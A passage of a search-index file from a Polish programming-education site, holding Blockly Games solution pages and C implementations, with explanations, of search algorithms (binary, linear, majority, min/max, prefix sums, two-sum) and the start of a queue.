zada\u0144</p>"},{"location":"programming/blockly/blockly-games/maze/","title":"Labirynt","text":""},{"location":"programming/blockly/blockly-games/maze/#prezentacja-rozwiazan","title":"Prezentacja rozwi\u0105za\u0144","text":"<p> Blockly Labirynt - rozwi\u0105zania zada\u0144</p>"},{"location":"programming/blockly/blockly-games/maze/#algorytm-do-zadania-10","title":"Algorytm do zadania 10","text":"<p> Metoda lewej r\u0119ki</p>"},{"location":"programming/blockly/blockly-games/pond-tutorial/","title":"Samouczek Stawu","text":""},{"location":"programming/blockly/blockly-games/pond-tutorial/#prezentacja-rozwiazan","title":"Prezentacja rozwi\u0105za\u0144","text":"<p> Blockly Samouczek Stawu - rozwi\u0105zania zada\u0144</p>"},{"location":"programming/blockly/blockly-games/turtle/","title":"\u017b\u00f3\u0142w","text":""},{"location":"programming/blockly/blockly-games/turtle/#prezentacja-rozwiazan","title":"Prezentacja rozwi\u0105za\u0144","text":"<p> Blockly \u017b\u00f3\u0142w - rozwi\u0105zania zada\u0144</p>"},{"location":"programming/c/","title":"C","text":"<p>C jest jednym z najstarszych i najbardziej wp\u0142ywowych j\u0119zyk\u00f3w programowania. Zosta\u0142 stworzony w latach 70. XX wieku w laboratoriach Bell przez Dennisa Ritchie'go. Do dzi\u015b jest podstaw\u0105 dla wielu nowoczesnych j\u0119zyk\u00f3w, takich jak C++, C#, Objective-C czy Python.</p>"},{"location":"programming/c/#kluczowe-cechy","title":"Kluczowe cechy","text":"<ol> <li> <p>Efektywno\u015b\u0107: C jest j\u0119zykiem kompilowanym, co oznacza, \u017ce kod \u017ar\u00f3d\u0142owy jest przekszta\u0142cany w kod maszynowy przed jego wykonaniem. To prowadzi do zwi\u0119kszenia wydajno\u015bci, czyni\u0105c C idealnym do zada\u0144 wymagaj\u0105cych wysokiej wydajno\u015bci.</p> </li> <li> <p>Kontrola na niskim poziomie: J\u0119zyk C daje programistom du\u017c\u0105 kontrol\u0119 nad systemem, pozwalaj\u0105c na manipulacj\u0119 na poziomie bit\u00f3w i bezpo\u015bredni dost\u0119p do pami\u0119ci. Dzi\u0119ki temu C jest cz\u0119sto wykorzystywany w systemach wbudowanych i tam, gdzie jest potrzeba bezpo\u015bredniego zarz\u0105dzania zasobami sprz\u0119towymi.</p> </li> <li> <p>Bogata biblioteka standardowa: C ma bogat\u0105 bibliotek\u0119 standardow\u0105, kt\u00f3ra obejmuje funkcje dla operacji matematycznych, manipulacji na ci\u0105gach znak\u00f3w, operacji na plikach, i wiele innych.</p> </li> <li> <p>Uniwersalno\u015b\u0107: J\u0119zyk C jest szeroko u\u017cywany na ca\u0142ym \u015bwiecie, a jego kompilatory s\u0105 dost\u0119pne na praktycznie wszystkich platformach i systemach operacyjnych.</p> </li> <li> <p>Podstawa dla innych j\u0119zyk\u00f3w: wiele nowoczesnych j\u0119zyk\u00f3w programowania, takich jak C++, Python, czy Objective-C, bazuje na j\u0119zyku C, a znajomo\u015b\u0107 C pomaga zrozumie\u0107 te j\u0119zyki na g\u0142\u0119bszym poziomie.</p> </li> </ol> <p>Ze wzgl\u0119du na swoj\u0105 wydajno\u015b\u0107 i kontrol\u0119 na niskim poziomie, C jest cz\u0119sto wykorzystywany do tworzenia system\u00f3w operacyjnych, sterownik\u00f3w sprz\u0119towych, j\u0105der system\u00f3w czasu rzeczywistego oraz innych aplikacji, kt\u00f3re wymagaj\u0105 bezpo\u015bredniej interakcji z sprz\u0119tem. Pomimo swojego wieku, C wci\u0105\u017c pozostaje jednym z najpopularniejszych j\u0119zyk\u00f3w programowania.</p>"},{"location":"programming/c/#popularnosc-jezyka","title":"Popularno\u015b\u0107 j\u0119zyka","text":"<p>Wykres popularno\u015bci j\u0119zyka C</p>"},{"location":"programming/c/algorithms/searching/binary-search/","title":"Wyszukiwanie binarne","text":""},{"location":"programming/c/algorithms/searching/binary-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/binary-search/#wersja-iteracyjna","title":"Wersja iteracyjna","text":""},{"location":"programming/c/algorithms/searching/binary-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint binarySearchIterative(int array[], int length, int number) {\n    int left = 0;\n    int right = length - 1;\n    int middle;\n\n    while (left &lt; right) {\n        middle = (left + right) / 2;\n        if (number &lt;= array[middle]) {\n            right = middle;\n        } else {\n            left = middle + 1;\n        }\n    }\n\n    if (array[left] == number) {\n        return left;\n    }\n\n    return -1;\n}\n\nint main() {\n    int array[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n    int number = 8;\n\n    int index = binarySearchIterative(array, 10, number);\n\n    if (index == -1) {\n      printf(\"Number not found in array\\n\");\n    } else {\n      printf(\"Index of given number is %d\\n\", index);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/binary-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binarySearchIterative</code> przyjmuje jako argumenty tablic\u0119 liczb, jej d\u0142ugo\u015b\u0107 i liczb\u0119 do znalezienia. Pocz\u0105tkowo ustawia wska\u017aniki na skrajne elementy tablicy - <code>left</code> na pocz\u0105tek, <code>right</code> na koniec.</p> <p>Nast\u0119pnie, w p\u0119tli <code>while</code>, oblicza \u015brodek tablicy (<code>middle</code>). Je\u017celi szukana liczba jest mniejsza lub r\u00f3wna elementowi \u015brodkowemu, <code>right</code> zostaje przesuni\u0119ty na pozycj\u0119 \u015brodka. W przeciwnym razie, <code>left</code> przesuwa si\u0119 na pozycj\u0119 po \u015brodkowym elemencie.</p> <p>P\u0119tla <code>while</code> kontynuuje dzia\u0142anie, dop\u00f3ki <code>left</code> jest mniejszy od <code>right</code>, dziel\u0105c tablic\u0119 na p\u00f3\u0142 z ka\u017cd\u0105 iteracj\u0105. To jest kluczowy aspekt wyszukiwania binarnego - za ka\u017cdym razem odrzucamy po\u0142ow\u0119 tablicy, co sprawia, \u017ce algorytm jest bardzo efektywny (ma z\u0142o\u017cono\u015b\u0107 \\(O(log n)\\)).</p> <p>Gdy p\u0119tla <code>while</code> ko\u0144czy dzia\u0142anie, sprawdzamy, czy element na pozycji <code>left</code> jest r\u00f3wny szukanej liczbie. Je\u015bli tak, zwracamy jego indeks. Je\u015bli nie, zwracamy \\(-1\\), co oznacza, \u017ce szukana liczba nie znajduje si\u0119 w tablicy.</p> <p>Funkcja <code>main</code> tworzy tablic\u0119 \\(10\\) element\u00f3w od \\(1\\) do \\(10\\), nast\u0119pnie wywo\u0142uje funkcj\u0119 <code>binarySearchIterative</code> szukaj\u0105c liczby \\(8\\). Je\u017celi wynikiem funkcji jest \\(-1\\), wypisywana jest na ekran informacja, \u017ce liczba nie zosta\u0142a znaleziona. W przeciwnym razie wypisywany jest indeks znalezionej liczby w tablicy.</p>"},{"location":"programming/c/algorithms/searching/binary-search/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":""},{"location":"programming/c/algorithms/searching/binary-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint binarySearchRecursive(int array[], int number, int left, int right) {\n  int middle;\n\n  if (left &lt; right) {\n    middle = (left + right) / 2;\n    if (number &lt;= array[middle]) {\n      return binarySearchRecursive(array, number, left, middle);\n    } else {\n      return binarySearchRecursive(array, number, middle + 1, right);\n    }\n  } else if (array[left] == number) {\n    return left;\n  }\n\n  return -1;\n}\n\nint main() {\n  int array[10] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10};\n  int number = 8;\n\n  int index = binarySearchRecursive(array, number, 0, 10);\n\n  if (index == -1) {\n    printf(\"Number not found in array\\n\");\n  } else {\n    printf(\"Index of given number is %d\\n\", index);\n  }\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/linear-search/","title":"Wyszukiwanie liniowe","text":""},{"location":"programming/c/algorithms/searching/linear-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/linear-search/#istnienie-elementu","title":"Istnienie elementu","text":""},{"location":"programming/c/algorithms/searching/linear-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdbool.h&gt;\n\nbool linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            return true;\n        }\n    }\n\n    return false;\n}\n\nint main() {\n    int array[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n    int number = 7;\n\n    bool result = linearSearch(array, n, number);\n\n    if (result) {\n        printf(\"Liczba jest w tablicy\\n\");\n    } else {\n        printf(\"Liczby nie ma w tablicy\\n\");\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/linear-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 4) zwraca jako wynik warto\u015b\u0107 prawda/fa\u0142sz i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 5). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 6). Je\u017celi tak, to zwracamy informacj\u0119 o znalezieniu warto\u015bci w tablicy (linia 7). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 <code>false</code> informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 11).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 15), jej rozmiar (linia 16), oraz warto\u015b\u0107 poszukiwanego elementu (linia 17). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>result</code> (linia 19). W zale\u017cno\u015bci od wyniku (linia 21) wypisujemy odpowiedni komunikat (linie 22 i 24).</p>"},{"location":"programming/c/algorithms/searching/linear-search/#pozycja-elementu","title":"Pozycja elementu","text":""},{"location":"programming/c/algorithms/searching/linear-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            return i;\n        }\n    }\n\n    return -1;\n}\n\nint main() {\n    int array[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n    int n = 10;\n    int number = 7;\n\n    int index = linearSearch(array, n, number);\n\n    if (index == -1) {\n        printf(\"Liczby nie ma w tablicy\\n\");\n    } else {\n        printf(\"Liczba jest pod indeksem %d\\n\", index);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/linear-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 3) zwraca jako wynik liczb\u0119 ca\u0142kowit\u0105 i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 4). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 5). Je\u017celi tak, to zwracamy indeks tej warto\u015bci w tablicy (linia 6). Po przej\u015bciu przez wszystkie indeksy i wyj\u015bciu z p\u0119tli (tzn. gdy nie znale\u017ali\u015bmy poszukiwanego elementu) zwracamy warto\u015b\u0107 \\(-1\\) informuj\u0105c\u0105, \u017ce poszukiwany element nie znajduje si\u0119 w tablicy (linia 10).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 14), jej rozmiar (linia 15), oraz warto\u015b\u0107 poszukiwanego elementu (linia 16). Nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami i jej wynik zapisujemy w nowej zmiennej <code>index</code> (linia 18). W zale\u017cno\u015bci od wyniku (linia 20) wypisujemy odpowiedni komunikat (linie 21 i 23).</p>"},{"location":"programming/c/algorithms/searching/linear-search/#wszystkie-pozycje-elementu","title":"Wszystkie pozycje elementu","text":""},{"location":"programming/c/algorithms/searching/linear-search/#implementacja_2","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid linearSearch(int array[], int n, int number) {\n    for (int i = 0; i &lt; n; i++) {\n        if (array[i] == number) {\n            printf(\"%d\\n\", i);\n        }\n    }\n}\n\nint main() {\n    int array[10] = {8, 2, 8, 4, 5, 6, 7, 8, 9, 8};\n    int n = 10;\n    int number = 8;\n\n    printf(\"Indeksy, pod ktorymi znajduje sie poszukiwana liczba:\\n\");\n    linearSearch(array, n, number);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/linear-search/#opis-implementacji_2","title":"Opis implementacji","text":"<p>Funkcja <code>linearSearch</code> (linia 3) nie zwraca wyniku i przyjmuje trzy argumenty: tablic\u0119 do przeszukania, rozmiar tablicy oraz warto\u015b\u0107 poszukiwanego elementu. Na pocz\u0105tku funkcji przechodzimy p\u0119tl\u0105 przez wszystkie kolejne indeksy w tablicy od \\(0\\) do \\(n-1\\) w\u0142\u0105cznie (linia 4). Dla ka\u017cdego indeksu sprawdzamy, czy pod tym indeksem w tablicy znajduje si\u0119 poszukiwana warto\u015b\u0107 (linia 5). Je\u017celi tak, to wypisujemy ten indeks (linia 6).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej programu na pocz\u0105tku przygotowujemy dane do problemu: tablic\u0119 (linia 12), jej rozmiar (linia 13), oraz warto\u015b\u0107 poszukiwanego elementu (linia 14). Nast\u0119pnie wypisujemy stosowny komunikat (linia 16) i wywo\u0142ujemy funkcj\u0119 <code>linearSearch</code> z wcze\u015bniej przygotowanymi parametrami (linia 17).</p>"},{"location":"programming/c/algorithms/searching/longest-growing-substring/","title":"Najd\u0142u\u017cszy sp\u00f3jny podci\u0105g rosn\u0105cy","text":""},{"location":"programming/c/algorithms/searching/longest-growing-substring/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/longest-growing-substring/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint longestGrowingSubstringLength(int n, int tab[]) {\n  int mx = 1;\n  int length = 1;\n\n  for (int i = 1; i &lt; n; i++) {\n    if (tab[i] &gt; tab[i - 1]) {\n      length += 1;\n      if (length &gt; mx) {\n        mx = length;\n      }\n    } else {\n      length = 1;\n    }\n  }\n\n  return mx;\n}\n\nint main() {\n  int tab[10] = {4, 9, 7, 2, 4, 7, 9, 3, 8, 6};\n  int n = 10;\n\n  int result = longestGrowingSubstringLength(n, tab);\n\n  printf(\"%d\\n\", result);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/majority/","title":"Znajdowanie lidera w zbiorze","text":""},{"location":"programming/c/algorithms/searching/majority/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/majority/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint countOccurences(int number, int array[], int length) {\n    int result = 0;\n\n    for (int i = 0; i &lt; length; i++) {\n        if (array[i] == number) {\n            result++;\n        }\n    }\n\n    return result;\n}\n\nint findMajority(int array[], int length) {\n    int counter = 1;\n    int currentCandidate = array[0];\n\n    for (int i = 1; i &lt; length; i++) {\n        if (counter == 0) {\n            currentCandidate = array[i];\n            counter = 1;\n        } else if (array[i] == currentCandidate) {\n            counter++;\n        } else {\n            counter--;\n        }\n    }\n\n    counter = countOccurences(currentCandidate, array, length);\n\n    if (counter &gt; length / 2) {\n        return currentCandidate;\n    } else {\n        return -1;\n    }\n}\n\nint main() {\n    int array[10] = {1, 2, 5, 5, 7, 5, 5, 10, 5, 5};\n\n    int majority = findMajority(array, 10);\n\n    if (majority == -1) {\n      printf(\"Majority element not found\\n\");\n    } else {\n      printf(\"Majority element: %d\\n\", majority);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/min-max-search/","title":"Jednoczesne wyszukiwanie minimum i maksimum","text":""},{"location":"programming/c/algorithms/searching/min-max-search/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/min-max-search/#podejscie-naiwne","title":"Podej\u015bcie naiwne","text":""},{"location":"programming/c/algorithms/searching/min-max-search/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid findMinMaxNaive(int array[], int n) {\n  int min, max;\n\n  min = array[0];\n  max = array[0];\n\n  for (int i = 1; i &lt; n; i++) {\n    if (array[i] &lt; min) {\n      min = array[i];\n    } else if (array[i] &gt; max) {\n      max = array[i];\n    }\n  }\n\n  printf(\"Min: %d\\n\", min);\n  printf(\"Max: %d\\n\", max);\n}\n\nint main() {\n  int array[11] = {3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11};\n\n  findMinMaxNaive(array, 11);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/min-max-search/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>findMinMaxNaive</code> (linia 5) przyjmuje tablic\u0119 o zadanej d\u0142ugo\u015bci i wypisuje jej elementy minimalny i maksymalny, korzystaj\u0105c z naiwnego algorytmu jednoczesnego znajdowania minimum i maksimum.</p> <p>Na pocz\u0105tku tworzymy dwie zmienne do zapami\u0119tania warto\u015bci min i max (linia 6), a nast\u0119pnie przypisujemy do nich warto\u015b\u0107 pierwszego elementu przeszukiwanej tablicy (linie 8 i 9). Kolejnym etapem jest przejrzenie wszystkich pozosta\u0142ych element\u00f3w tablicy za pomoc\u0105 p\u0119tli (linia 11). Je\u017celi sprawdzany element z tablicy ma warto\u015b\u0107 mniejsz\u0105 od obecnej warto\u015bci minimum (linia 12), to zapami\u0119tujemy now\u0105 warto\u015b\u0107 minimum (linia 13). W przeciwnym wypadku sprawdzamy, czy obecny element ma warto\u015b\u0107 wi\u0119ksz\u0105 od obecnej warto\u015bci maksimum (linia 14), a je\u017celi tak to zapami\u0119tujemy now\u0105 warto\u015b\u0107 maksimum (linia 15). Na koniec, po przej\u015bciu przez wszystkie elementy tablicy, wypisujemy znalezione warto\u015bci minimum i maksimum (linie 19 i 20).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy przyk\u0142adow\u0105 tablic\u0119 (linia 24), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>findMinMaxNaive</code> (linia 26).</p>"},{"location":"programming/c/algorithms/searching/min-max-search/#podejscie-optymalne","title":"Podej\u015bcie optymalne","text":""},{"location":"programming/c/algorithms/searching/min-max-search/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid findMinMaxOptimal(int array[], int length) {\n  int min, max;\n  int middle = (length + 1) / 2;\n  int minCandidates[middle], maxCandidates[middle];\n\n  for (int i = 1; i &lt; length; i += 2) {\n    if (array[i - 1] &lt; array[i]) {\n      minCandidates[i / 2] = array[i - 1];\n      maxCandidates[i / 2] = array[i];\n    } else {\n      minCandidates[i / 2] = array[i];\n      maxCandidates[i / 2] = array[i - 1];\n    }\n  }\n\n  if (length % 2 != 0) {\n    minCandidates[middle - 1] = array[length - 1];\n    maxCandidates[middle - 1] = array[length - 1];\n  }\n\n  min = minCandidates[0];\n  max = maxCandidates[0];\n\n  for (int i = 1; i &lt; middle; i++) {\n    if (minCandidates[i] &lt; min) {\n      min = minCandidates[i];\n    }\n\n    if (maxCandidates[i] &gt; max) {\n      max = maxCandidates[i];\n    }\n  }\n\n  printf(\"Min: %d\\n\", min);\n  printf(\"Max: %d\\n\", max);\n}\n\nint main() {\n  int array[11] = {3, 6, 1, 9, 10, 4, -4, 6, 12, 5, 11};\n\n  findMinMaxOptimal(array, 11);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/min-max-search/#opis-implementacji_1","title":"Opis implementacji","text":"<p>Funkcja <code>findMinMaxOptimal</code> (linia 5) przyjmuje tablic\u0119 o zadanej d\u0142ugo\u015bci i wypisuje jej elementy minimalny i maksymalny, korzystaj\u0105c z optymalnego algorytmu jednoczesnego znajdowania minimum i maksimum.</p> <p>Na pocz\u0105tku funkcji definiujemy dwie tablice pomocnicze (linia 8): kandydat\u00f3w na minimum (<code>minCandidates</code>) oraz kandydat\u00f3w na maksimum (<code>maxCandidates</code>). Ka\u017cda z tych tablic ma d\u0142ugo\u015b\u0107 r\u00f3wn\u0105 po\u0142owie d\u0142ugo\u015bci tablicy pocz\u0105tkowej (zwi\u0119kszonej o jeden w przypadku tablic o nieparzystej d\u0142ugo\u015bci).</p> <p>Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez ka\u017cd\u0105 s\u0105siaduj\u0105c\u0105 par\u0119 element\u00f3w z pocz\u0105tkowej tablicy (linia 10). Je\u017celi pierwszy z element\u00f3w jest mniejszy od swojego s\u0105siada (linia 11), to pierwszy z pary wrzucamy do tablicy kandydat\u00f3w na minimum (linia 12), a kolejny do tablicy kandydat\u00f3w na maksimum (linia 13). W przeciwnym wypadku post\u0119pujemy na odwr\u00f3t (linie 15 i 16).</p> <p>Je\u017celi pocz\u0105tkowa tablica jest nieparzystej d\u0142ugo\u015bci (linia 20), to jej ostatni element dopisujemy do obu tablic pomocniczych: kandydat\u00f3w na minimum (linia 21) i kandydat\u00f3w na maksimum (linia 22) na ostatnie pozycje w tych tablicach.</p> <p>Nast\u0119pnie przechodzimy do poszukiwania minimum i maksimum. Na pocz\u0105tek przyjmujemy pocz\u0105tkowe warto\u015bci tablic pomocniczych jako obecne warto\u015bci minimum i maksimum. Minimum bierzemy z kandydat\u00f3w na minimum (linia 25), a maksimum z kandydat\u00f3w na maksimum (linia 26).</p> <p>W kolejnym kroku przechodzimy p\u0119tl\u0105 przez obie tablice pomocnicze (linia 28). Najpierw sprawdzamy, czy znale\u017ali\u015bmy element mniejszy od obecnej warto\u015bci minimum w tablicy kandydat\u00f3w na minimum (linia 29). Je\u017celi tak, to przyjmujemy now\u0105 warto\u015b\u0107 minimum (linia 30). Podobnie post\u0119pujemy w przypadku maksimum. Je\u017celi w tablicy kandydat\u00f3w na maksimum znale\u017ali\u015bmy element wi\u0119kszy od obecnej warto\u015bci maksimum (linia 33), to przyjmujemy now\u0105 warto\u015b\u0107 maksimum (linia 34).</p> <p>Na ko\u0144cu funkcji wypisujemy znalezione warto\u015bci minimum (linia 38) oraz maksimum (linia 39).</p> <p>W cz\u0119\u015bci g\u0142\u00f3wnej tworzymy przyk\u0142adow\u0105 tablic\u0119 (linia 43), a nast\u0119pnie wywo\u0142ujemy funkcj\u0119 <code>findMinMaxOptimal</code> (linia 45).</p>"},{"location":"programming/c/algorithms/searching/min-or-max/","title":"Wyszukiwanie minimum i maksimum","text":""},{"location":"programming/c/algorithms/searching/min-or-max/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/min-or-max/#wyszukiwanie-wartosci-minimum-i-maksimum","title":"Wyszukiwanie warto\u015bci minimum i maksimum","text":""},{"location":"programming/c/algorithms/searching/min-or-max/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint findMin(int n, int tab[]) {\n  int min = tab[0];\n\n  for (int i = 1; i &lt; n; i++) {\n    if (tab[i] &lt; min) {\n      min = tab[i];\n    }\n  }\n\n  return min;\n}\n\nint findMax(int n, int tab[]) {\n  int max = tab[0];\n\n  for (int i = 1; i &lt; n; i++) {\n    if (tab[i] &gt; max) {\n      max = tab[i];\n    }\n  }\n\n  return max;\n}\n\nint main() {\n  int tab[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n  int n = 10;\n\n  int min = findMin(n, tab);\n  int max = findMax(n, tab);\n\n  printf(\"Min: %d\\n\", min);\n  printf(\"Max: %d\\n\", max);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/min-or-max/#wyszukiwanie-indeksow-wartosci-minimum-i-maksimum","title":"Wyszukiwanie indeks\u00f3w warto\u015bci minimum i maksimum","text":""},{"location":"programming/c/algorithms/searching/min-or-max/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nint findMinIndex(int n, int tab[]) {\n  int minInd = 0;\n\n  for (int i = 1; i &lt; n; i++) {\n    if (tab[i] &lt; tab[minInd]) {\n      minInd = i;\n    }\n  }\n\n  return minInd;\n}\n\nint findMaxIndex(int n, int tab[]) {\n  int maxInd = 0;\n\n  for (int i = 1; i &lt; n; i++) {\n    if (tab[i] &gt; tab[maxInd]) {\n      maxInd = i;\n    }\n  }\n\n  return maxInd;\n}\n\nint main() {\n  int tab[10] = {8, 2, 9, 10, 5, 4, 2, 7, 18, 0};\n  int n = 10;\n\n  int minInd = findMinIndex(n, tab);\n  int maxInd = findMaxIndex(n, tab);\n\n  printf(\"Min index: %d\\n\", minInd);\n  printf(\"Max index: %d\\n\", maxInd);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/prefix-sum/","title":"Sumy prefiksowe","text":""},{"location":"programming/c/algorithms/searching/prefix-sum/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/prefix-sum/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid computePrefixSum(int numbersCount, int numbersArray[],\n                      int prefixSumArray[]) {\n  prefixSumArray[0] = 0;\n  for (int i = 1; i &lt;= numbersCount; i++) {\n    prefixSumArray[i] = prefixSumArray[i - 1] + numbersArray[i - 1];\n  }\n}\n\nvoid answerQueries(int numbersCount, int numbersArray[], int queriesCount,\n                   int queriesArray[][2]) {\n  int prefixSumArray[numbersCount + 1];\n  computePrefixSum(numbersCount, numbersArray, prefixSumArray);\n  for (int i = 0; i &lt; queriesCount; i++) {\n    int result = prefixSumArray[queriesArray[i][1] + 1] -\n                 prefixSumArray[queriesArray[i][0]];\n    printf(\"sum(%d:%d) = %d\\n\", queriesArray[i][0], queriesArray[i][1], result);\n  }\n}\n\nint main() {\n  int numbersCount = 10;\n  int numbersArray[10] = {8, 4, 1, 5, 8, 0, 12, 9, 26, 3};\n  int queriesCount = 3;\n  int queriesArray[3][2] = {{1, 5}, {0, 3}, {6, 9}};\n\n  answerQueries(numbersCount, numbersArray, queriesCount, queriesArray);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/sum-of-two/","title":"Suma dw\u00f3ch liczb","text":""},{"location":"programming/c/algorithms/searching/sum-of-two/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/searching/sum-of-two/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":""},{"location":"programming/c/algorithms/searching/sum-of-two/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid sumOfTwoNaive(int n, int tab[], int sum) {\n    for (int i = 0; i &lt; n; i++) {\n        for (int j = i+1; j &lt; n; j++) {\n            if (tab[i] + tab[j] == sum) {\n              printf(\"%d, %d\\n\", tab[i], tab[j]);\n                return;\n            }\n        }\n    }\n\n  printf(\"Not found\\n\");\n}\n\nint main() {\n    int n = 10;\n    int tab[10] = {1, 2, 4, 6, 8, 9, 10, 12, 13, 15};\n    int sum = 18;\n\n    sumOfTwoNaive(n, tab, sum);\n\n    return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/searching/sum-of-two/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":""},{"location":"programming/c/algorithms/searching/sum-of-two/#implementacja_1","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n\nvoid sumOfTwoOptimal(int n, int tab[], int sum) {\n  int left = 0;\n  int right = n - 1;\n\n  while (left &lt; right &amp;&amp; tab[left] + tab[right] != sum) {\n    if (tab[left] + tab[right] &lt; sum) {\n      left++;\n    } else {\n      right--;\n    }\n  }\n\n  if (left &lt; right) {\n    printf(\"%d, %d\\n\", tab[left], tab[right]);\n  } else {\n    printf(\"Not found\\n\");\n  }\n}\n\nint main() {\n  int n = 10;\n  int tab[10] = {1, 2, 4, 6, 8, 9, 10, 12, 13, 15};\n  int sum = 18;\n\n  sumOfTwoOptimal(n, tab, sum);\n\n  return 0;\n}\n</code></pre>"},{"location":"programming/c/algorithms/structures/queue/","title":"Kolejka","text":""},{"location":"programming/c/algorithms/structures/queue/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/c/algorithms/structures/queue/#implementacja","title":"Implementacja","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n\ntypedef struct element {\n    int value;\n    struct element *next;\n} element;\n\ntypedef struct Queue {\n    element *front_el;\n    int el_count;\n} Queue;\n\nvoid init(Queue *queue) {\n    queue-&gt;front_el = NULL;\n    queue-&gt;el_count = 0;\n}\n\nvoid push(int value, Queue *queue) {\n    element *new_el = malloc(sizeof(element));\n\n    new_el-&gt;value = value;\n    new_el-&gt;next = NULL;\n\n    if (queue-&gt;front_el == NULL) {\n        queue-&gt;front_el = new_el;\n        queue-&gt;el_count++;\n        return;\n    }\n\n    element *last_el = queue-&gt;front_el;\n    while (last_el-&gt;next != NULL) {\n        last_el = last_el-&gt;next;\n    }\n\n    last_el-&gt;next = 